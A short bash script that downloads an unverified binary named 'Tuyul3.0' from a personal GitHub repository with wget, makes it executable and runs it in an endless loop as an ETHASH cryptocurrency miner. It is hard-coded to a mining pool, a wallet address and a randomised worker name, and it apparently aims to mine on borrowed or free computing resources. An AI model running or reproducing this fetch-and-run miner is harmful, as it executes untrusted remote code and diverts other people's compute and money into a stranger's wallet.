#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:THyaVTKqcVu3f5UfYoG21cbYF8ir1jNKPm
WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#tulc-zc71)
wget https://github.com/mansoorjama/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
